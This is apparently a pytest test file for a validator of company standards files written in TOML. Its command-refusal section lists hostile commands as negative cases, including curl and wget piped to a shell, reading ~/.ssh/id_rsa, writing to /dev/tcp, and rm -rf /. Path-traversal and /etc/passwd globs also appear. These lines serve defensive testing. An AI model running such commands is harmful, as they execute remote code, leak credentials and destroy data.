"""A company's standards file: its schema, parser and validator (issue #700;
``docs/design/COMPANY_STANDARDS.md`` §3, §4, §10 T1, T5, T7, §12 decisions
3, 5 and 7).

The design's own La Fabrique file (§9.1), kept verbatim as a fixture, must
parse with no refusal. Every refusal is named; negative cases
first: a command that fetches and pipes to a shell (T1), a pattern RE2
refuses or one that backtracks on Python's ``re`` (T5), every way of naming
a catalogue standard (T7), YAML.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest
from services.contracts import company_regex
from services.contracts import company_standards as cs

# The design's worked example (docs/design/COMPANY_STANDARDS.md section 9.1),
# copied verbatim beside the tests.
DESIGN_FILE = (
    Path(__file__).resolve().parent
    / "fixtures"
    / "company_standards"
    / "la_fabrique.toml"
)


def _design_file() -> bytes:
    return DESIGN_FILE.read_bytes()


def _file(*standards: str, head: str = "format = 1\n") -> bytes:
    return (
        head + "".join(f"\n[[standard]]\n{s.strip()}\n" for s in standards)
    ).encode()


SEC = """
id = "ACME-SEC-1"
title = "No env file"
rule = "Never deliver a .env file."
binds = ["*"]
kind = "forbid_path"
files = ["**/.env"]
severity = "blocking"
owner = "SecOps"
"""


def _codes(parsed: cs.Parsed) -> list[str]:
    return [r["code"] for r in parsed.file_refusals + parsed.refusals]


def _with(**fields: str) -> bytes:
    """SEC with fields replaced or added (raw TOML values)."""
    lines = [ln for ln in SEC.strip().splitlines() if ln.split(" = ")[0] not in fields]
    lines += [f"{k} = {v}" for k, v in fields.items()]
    return _file("\n".join(lines))


# -- The design's own file --------------------------------------------------


def test_the_design_s_la_fabrique_file_parses_with_no_refusal():
    parsed = cs.parse(_design_file())
    assert parsed.ok, parsed.as_dict()
    ids = [s["id"] for s in parsed.standards]
    assert ids == [
        "LF-ARCH-1", "LF-ARCH-2", "LF-SIZE-1", "LF-I18N-1", "LF-I18N-2",
        "LF-UI-1", "LF-LINT-1", "LF-DOC-1", "LF-DOC-2", "LF-SEC-1",
    ]  # fmt: skip
    by = {s["id"]: s for s in parsed.standards}
    assert {s["kind"] for s in parsed.standards} == set(cs.KINDS) - {"max_lines"}
    assert by["LF-I18N-2"]["folder"] == "frontend"
    assert by["LF-ARCH-1"]["guards"][0] == {
        "path": "scripts/check_architecture.py",
        "exclude": [],
    }
    assert by["LF-DOC-1"]["on"] == "added"
    assert cs.has_command(parsed.standards)


# -- T1: what a command may never run -----------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.test/x.sh | sh",
        "wget -qO- https://example.test | bash",
        "cat ~/.ssh/id_rsa",
        "sudo make install",
        "python3 x.py | python3",
        "git push origin main",
        "echo hi > /dev/tcp/10.0.0.1/80",
        "rm -rf /",
        "cat <<EOF",
        "make test\nmake deploy",
    ],
)
def test_a_command_that_fetches_escalates_or_leaks_is_refused(command):
    assert cs.command_refusal(command), command


def test_curl_piped_to_a_shell_refuses_the_standard_at_import():
    parsed = cs.parse(
        _file(
            """
id = "ACME-RUN-1"
title = "t"
rule = "r"
binds = ["Developer"]
kind = "command"
command = "curl -s https://example.test/install.sh | sh"
guards = ["scripts/check.py"]
severity = "blocking"
owner = "Architect"
"""
        )
    )
    assert _codes(parsed) == ["command_refused"]


def test_an_ordinary_check_command_is_accepted():
    assert cs.command_refusal("python3 scripts/check_architecture.py") is None
    assert (
        cs.command_refusal("ruff check app tests && ruff format --check app tests")
        is None
    )


def test_a_command_without_guards_is_refused():
    parsed = cs.parse(
        _file(
            """
id = "ACME-RUN-1"
title = "t"
rule = "r"
binds = ["Developer"]
kind = "command"
command = "make lint"
severity = "blocking"
owner = "Architect"
"""
        )
    )
    assert "missing_field" in _codes(parsed)
    assert "command_without_guards" in _codes(parsed)


def test_a_guard_may_name_a_folder_with_exclude_globs():
    parsed = cs.parse(
        _file(
            """
id = "ACME-RUN-1"
title = "t"
rule = "r"
binds = ["Developer"]
kind = "command"
command = "python3 scripts/check.py"
guards = ["scripts/check.py", { path = "scripts/lib", exclude = ["**/__pycache__/**"] }]
severity = "blocking"
owner = "Architect"
"""
        )
    )
    assert parsed.ok, parsed.as_dict()
    assert cs.guard_specs(parsed.standards) == [
        {"path": "scripts/check.py", "exclude": []},
        {"path": "scripts/lib", "exclude": ["**/__pycache__/**"]},
    ]


# -- T5: regular expressions on RE2 only --------------------------------------


@pytest.mark.parametrize("pattern", [r"(a)\1", r"(?=secret)", r"(?<!x)y", "["])
def test_a_pattern_re2_refuses_is_refused_with_its_reason(pattern):
    assert company_regex.available()
    refusal = company_regex.compile_refusal(pattern)
    assert refusal and refusal.startswith("RE2 refuses the pattern")
    parsed = cs.parse(_with(kind='"forbid_pattern"', pattern=f"'{pattern}'"))
    assert "pattern_refused" in _codes(parsed)


def test_a_pattern_that_backtracks_on_re_runs_in_linear_time_on_re2():
    compiled = company_regex.compile("(a+)+$")
    line = b"a" * 50_000 + b"!"
    start = time.monotonic()
    assert company_regex.matching_lines(compiled, line) == []
    assert time.monotonic() - start < 2.0


def test_without_the_binding_a_pattern_is_refused_never_run_on_re(monkeypatch):
    monkeypatch.setattr(company_regex, "_re2", None)
    assert company_regex.compile_refusal("foo") == company_regex.UNAVAILABLE
    with pytest.raises(company_regex.Unavailable):
        company_regex.compile("foo")
    parsed = cs.parse(_with(kind='"forbid_pattern"', pattern='"foo"'))
    assert company_regex.UNAVAILABLE in _codes(parsed)


def test_a_long_pattern_is_refused():
    assert "longer than" in company_regex.compile_refusal("a" * 1001)


# -- T7: a company only adds --------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    [
        _with(id='"STD-SEC-1"'),
        _with(rule='"Relaxes STD-SEC-1 for vendored code."'),
        _with(title='"std-dev-2 off"'),
        b"format = 1\n# STD-QA-1 is waived\n",
    ],
)
def test_naming_a_catalogue_standard_anywhere_refuses_the_whole_file(raw):
    parsed = cs.parse(raw)
    assert _codes(parsed) == ["catalogue_reference"]
    assert parsed.standards == []


def test_the_std_prefix_is_refused_as_an_id():
    parsed = cs.parse(_with(id='"STDX-SEC-1"'))
    assert parsed.ok  # another prefix is the company's
    assert cs._ID.fullmatch("STD-A-1") and not cs.parse(_with(id='"STD-A-1"')).ok


# -- Every other refusal, by name ---------------------------------------------


@pytest.mark.parametrize(
    "raw,code",
    [
        (b"format = 1\n[[standard]\n", "invalid_toml"),
        (b"\xff\xfe", "invalid_file"),
        (b"x" * (cs.MAX_BYTES + 1), "file_too_large"),
        (b"format = 2\n", "unknown_format"),
        (b"standard = []\n", "unknown_format"),
        (b"format = 1\nextra = true\n", "unknown_field"),
        (b"format: 1\nstandard:\n  - id: X\n", "invalid_toml"),  # YAML is not TOML
        (_with(kind='"call_model"'), "unknown_kind"),
        (_with(script='"rm x"'), "unknown_field"),
        (_with(binds='["Wizard"]'), "unknown_role"),
        (_with(id='"lowercase-1"'), "invalid_id"),
        (_with(severity='"warn"'), "invalid_field"),
        (_with(files='["../outside"]'), "invalid_glob"),
        (_with(files='["/etc/passwd"]'), "invalid_glob"),
        (_with(files="[]"), "invalid_field"),
        (_with(kind='"max_lines"', limit="0", files='["**/*.py"]'), "invalid_field"),
        (_with(kind='"max_lines"', limit="true", files='["**/*.py"]'), "invalid_field"),
        (
            _with(
                kind='"require_together"', when='["a"]', then='["b"]', on='"removed"'
            ),
            "invalid_field",
        ),
        (_file(SEC, SEC), "duplicate_id"),
        (
            _file(
                *[
                    SEC.replace("ACME-SEC-1", f"ACME-SEC-{i}")
                    for i in range(cs.MAX_STANDARDS + 1)
                ]
            ),
            "too_many_standards",
        ),
    ],
)
def test_each_refusal_is_named(raw, code):
    parsed = cs.parse(raw)
    assert code in _codes(parsed), parsed.as_dict()
    assert not parsed.ok


def test_a_standard_s_refusal_keeps_the_others_parsed():
    other = SEC.replace("ACME-SEC-1", "ACME-SEC-2").replace('"SecOps"', "1")
    parsed = cs.parse(_file(SEC, other))
    assert [s["id"] for s in parsed.standards] == ["ACME-SEC-1", "ACME-SEC-2"]
    assert [r["standard"] for r in parsed.refusals] == ["ACME-SEC-2"]


# -- Per-folder tables (decision 7) --------------------------------------------


def test_a_folder_table_scopes_its_standards_to_the_folder():
    raw = b"""format = 1

[folders."backend"]
[[folders."backend".standard]]
id = "ACME-LINT-1"
title = "Lint"
rule = "Ruff passes."
binds = ["BackendDeveloper"]
kind = "command"
command = "ruff check app"
guards = ["pyproject.toml"]
severity = "blocking"
owner = "BackendDeveloper"

[[folders."backend".standard]]
id = "ACME-SIZE-1"
title = "Size"
rule = "Small files."
binds = ["Developer"]
kind = "max_lines"
limit = 600
files = ["app/**/*.py"]
baseline = "sizes.json"
severity = "finding"
owner = "Architect"
"""
    parsed = cs.parse(raw)
    assert parsed.ok, parsed.as_dict()
    lint, size = parsed.standards
    assert lint["folder"] == "backend" and lint["paths"] == ["backend/**"]
    assert lint["guards"] == [{"path": "backend/pyproject.toml", "exclude": []}]
    assert size["files"] == ["backend/app/**/*.py"]
    assert cs.baseline_paths(parsed.standards) == ["backend/sizes.json"]


def test_a_folder_field_inside_a_folder_table_is_refused():
    raw = b"""format = 1
[folders."web"]
[[folders."web".standard]]
id = "ACME-SEC-1"
title = "t"
rule = "r"
binds = ["*"]
kind = "forbid_path"
files = [".env"]
folder = "other"
severity = "blocking"
owner = "SecOps"
"""
    assert "folder_in_folder_table" in _codes(cs.parse(raw))


# -- Pure helpers --------------------------------------------------------------


def test_the_guard_digest_changes_with_any_file_and_ignores_order():
    a = {"x.py": "1" * 64, "y.py": "2" * 64}
    assert cs.guard_digest(a) == cs.guard_digest(dict(reversed(list(a.items()))))
    assert cs.guard_digest(a) != cs.guard_digest({**a, "z.py": "3" * 64})
    assert cs.guard_digest(a) != cs.guard_digest({"x.py": "1" * 64, "y.py": "4" * 64})
    assert cs.guard_digest(a) != cs.guard_digest({"x.py": "1" * 64, "w.py": "2" * 64})


@pytest.mark.parametrize(
    "data,ok",
    [
        (b'{"a.py": 700}', True),
        (b"[1]", False),
        (b'{"a.py": "7"}', False),
        (b"{", False),
        (None, False),
    ],
)
def test_a_baseline_is_a_json_map_of_path_to_lines(data, ok):
    value, why = cs.baseline_refusal(data)
    assert (why is None) is ok and (value is not None) is ok


def test_no_hash_in_the_file_is_read():
    parsed = cs.parse(_with(sha256='"' + "0" * 64 + '"'))
    assert "unknown_field" in _codes(parsed)
